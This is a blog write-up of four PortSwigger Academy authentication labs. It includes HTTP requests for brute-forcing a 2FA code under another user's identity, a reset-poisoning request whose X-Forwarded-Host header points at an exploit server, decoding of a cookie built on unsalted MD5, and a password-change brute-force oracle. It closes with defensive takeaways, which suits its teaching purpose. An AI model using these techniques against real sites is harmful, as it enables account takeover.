---
layout: post
title: "PortSwigger Web Security Academy: Authentication Logic Failures"
date: 2026-08-28
platform: "PortSwigger Web Security Academy"
difficulty: "Medium"
category: "Web Security"
description: "Four authentication labs demonstrating broken 2FA state, recoverable stay-logged-in cookies, reset poisoning, and password-change brute force."
reading_time: "9 min"
tags: [web, authentication, 2fa, password-reset, brute-force, burp-suite]
techniques: [request sequencing, cookie decoding, header manipulation, response filtering]
tools: [Burp Suite, Intruder, email client]
disclaimer: "Performed against PortSwigger Web Security Academy authentication labs. Usernames, passwords, cookies, exploit-server URLs, and victim data are lab-only; the source's exploit-server hostname is intentionally omitted."
toc_items:
  - id: "broken-2fa"
    label: "Broken 2FA logic"
  - id: "cookie-cracking"
    label: "Cookie cracking"
  - id: "reset-poisoning"
    label: "Reset poisoning"
  - id: "password-change"
    label: "Password-change brute force"
---

<div class="info-box"><table><tr><td>Account</td><td><code>wiener:peter</code> (lab user)</td></tr><tr><td>Victim</td><td><code>carlos</code> (lab user)</td></tr><tr><td>Coverage</td><td>2FA, cookies, reset flow, password change</td></tr><tr><td>Interface</td><td>HTTP requests and email client</td></tr></table></div>

The useful habit across these exercises was to model authentication as a state machine. A correct password is only one state; the application must also bind the second factor, reset token, session, and recovery action to the right identity.

## Broken 2FA logic {#broken-2fa}

The first lab exposed a three-request login flow:

1. `POST /login` submitted the username and password.
2. `GET /login2` displayed the MFA prompt and triggered delivery of the code.
3. `POST /login2` verified the submitted code.

The verification request carried a user-controlled identity value. The source notes changed that value to `carlos` and brute-forced the four-digit code in Burp Intruder while waiting for the victim's code to arrive.

```http
POST /login2 HTTP/1.1
...

verify=carlos&mfa-code=0000
```

<figure class="evidence"><img src="{{ '/assets/writeups/portswigger-authentication/mfa-request.webp' | relative_url }}" alt="PortSwigger 2FA lab verification request" loading="lazy"><figcaption>The second-factor request was not strongly bound to the session that initiated it.</figcaption></figure>

<figure class="evidence"><img src="{{ '/assets/writeups/portswigger-authentication/mfa-bruteforce.webp' | relative_url }}" alt="Burp Intruder results for the 2FA lab" loading="lazy"><figcaption>A small response difference identified the valid lab code.</figcaption></figure>

## Cookie cracking {#cookie-cracking}

The stay-logged-in cookie encoded the username and an MD5 digest:

```text
Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQ
```

Base64 decoding produced:

```text
carlos:26323c16d5f4dabff3bb136f2460a943
```

The digest matched the MD5 of the lab password `onceuponatime`:

```text
MD5("onceuponatime") = 26323c16d5f4dabff3bb136f2460a943
```

<figure class="evidence"><img src="{{ '/assets/writeups/portswigger-authentication/cookie-decode.webp' | relative_url }}" alt="Decoded stay-logged-in cookie from the authentication lab" loading="lazy"><figcaption>Encoding is not encryption, and a fast unsalted hash is poor password protection.</figcaption></figure>

The source exercise used an XSS comment payload to make the victim's browser send its cookie to a lab-controlled server. The public version does not reproduce the exploit-server URL.

## Reset poisoning {#reset-poisoning}

The password-reset workflow sent a tokenized link to the selected user's email. The reset URL was constructed using request metadata, so the source notes supplied an `X-Forwarded-Host` value pointing to a lab exploit server. When `carlos` followed the link, the token appeared in the server's access log.

```http
POST /forgot-password HTTP/1.1
Host: <lab-host>
X-Forwarded-Host: <authorized-exploit-server>

username=carlos
```

<figure class="evidence"><img src="{{ '/assets/writeups/portswigger-authentication/reset-poisoning.webp' | relative_url }}" alt="PortSwigger password reset poisoning request" loading="lazy"><figcaption>The reset link trusted a host header that should not have controlled password-reset URLs.</figcaption></figure>

This is a workflow flaw, not a cryptographic break. A reset token can be strong and still be disclosed through an attacker-controlled delivery URL.

## Password-change brute force {#password-change}

The final lab had an account-locking behavior that looked like a defense. Sending a wrong current password caused a lock, but the application handled mismatched new-password fields differently. That response difference enabled a brute-force strategy:

```text
current-password=<candidate>
new-password=one
new-password-confirm=two
```

The Intruder filter searched for `Current password is incorrect`, allowing the valid current password to stand out without repeatedly locking the account.

<figure class="evidence"><img src="{{ '/assets/writeups/portswigger-authentication/password-bruteforce.webp' | relative_url }}" alt="Burp request and response for password-change brute force" loading="lazy"><figcaption>Validation order and response wording created an observable oracle.</figcaption></figure>

## Takeaways

- Bind every authentication step to the same server-side identity and session.
- Base64 and unsalted MD5 do not protect a password-derived cookie.
- Reset URLs must use a trusted, configured origin and should not be built from arbitrary forwarding headers.
- Rate limits are only useful if every branch enforces them consistently and responses do not reveal a bypass condition.
